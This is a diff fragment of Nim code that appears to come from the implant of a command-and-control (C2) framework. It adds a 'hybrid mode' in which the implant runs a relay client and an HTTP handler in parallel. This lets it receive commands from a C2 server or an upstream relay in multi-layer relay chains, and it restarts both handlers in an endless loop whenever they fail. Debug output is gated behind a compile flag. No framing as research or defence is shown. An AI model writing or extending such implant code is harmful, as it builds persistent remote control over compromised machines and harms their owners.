+                            echo "[DEBUG] 📡 Running BOTH relay client AND HTTP handlers for multi-layer support"
+                            echo "[DEBUG] 🌐 HTTP handler: Can receive 'relay port' commands from C2"
+                            echo "[DEBUG] 📡 Relay client: Receives commands from upstream relay"
+                        
+                        # HYBRID MODE: Run both handlers simultaneously for multi-layer relay chains
+                        while true:
+                            try:
+                                when defined debug:
+                                    echo "[MAIN] 🚀 Starting HYBRID mode handlers (relay client + HTTP)"
+                                
+                                # Start both handlers in parallel using asyncdispatch
+                                let relayClientFuture = safeRelayClientHandler(host, port)
+                                let httpHandlerFuture = safeHttpHandler()
+                                
+                                # Wait for either one to complete (they should run indefinitely)
+                                await relayClientFuture or httpHandlerFuture
+                                
+                                when defined debug:
+                                    echo "[MAIN] 🔄 One of the handlers ended, restarting both in 5 seconds..."
+                                
+                                await sleepAsync(5000)  # Wait before restart
+                            except Exception as e:
+                                when defined debug:
+                                    echo "[MAIN] 💥 Critical error in hybrid relay loop: " & e.msg
+                                await sleepAsync(10000)  # Longer wait on critical error
+                    else:
+                        when defined debug:
+                            echo "[DEBUG] Failed to connect to relay. Exiting."
+                except:
+                    when defined debug:
+                        echo "[DEBUG] Invalid relay address format"
                     return
             else:
                 when defined debug:
-                    echo "[DEBUG] Invalid relay URL format"
+                    echo "[DEBUG] Invalid port format in relay URL"
                 return
         else:
             when defined debug:
-                echo "[DEBUG] No relay address specified"
+                echo "[DEBUG] Invalid relay URL format"
             return
     else:
+        when defined debug:
+            echo "[DEBUG] No relay address specified - continuing with STANDARD HTTP mode"
+        
         # Start HTTP handler only - relay server starts on demand via commands
         when defined debug:
             echo "[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)"
-        
-        when defined debug:
             echo "[DEBUG] ✅ Starting async event loop"
             echo "[DEBUG] 🚀 Starting HTTP Handler..."
             echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
-        
-        # Start HTTP handler with safe restart mechanism
-        when defined debug:
             echo "[DEBUG] ✅ Starting HTTP handler with safe restart"
             echo "[DEBUG] 🔄 Running main loop..."
         
